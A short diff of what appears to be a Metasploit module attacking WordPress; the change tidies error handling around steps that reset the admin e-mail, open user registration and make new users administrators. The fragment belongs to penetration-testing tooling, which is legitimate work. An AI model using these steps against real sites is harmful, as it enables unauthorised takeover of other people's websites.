@@ -75,20 +75,20 @@ class MetasploitModule < Msf::Auxiliary
 
     if datastore['WPEMAIL'].present? && (datastore['WPEMAIL'] =~ URI::MailTo::EMAIL_REGEXP)
       print_warning("Changing admin e-mail address to #{datastore['WPEMAIL']}...")
-      if set_wp_option('admin_email', datastore['WPEMAIL'], ajax_security).nil?
+      unless set_wp_option('admin_email', datastore['WPEMAIL'], ajax_security)
         print_error('Failed to change the admin e-mail address')
         return
       end
     end
 
     print_warning('Enabling user registrations...')
-    if set_wp_option('users_can_register', '1', ajax_security).nil?
+    unless set_wp_option('users_can_register', '1', ajax_security)
       print_error('Failed to enable user registrations')
       return
     end
 
     print_warning('Setting the default user role type to administrator...')
-    if set_wp_option('default_role', 'administrator', ajax_security).nil?
+    unless set_wp_option('default_role', 'administrator', ajax_security)
       print_error("Failed to set the default user role")
       return
     end
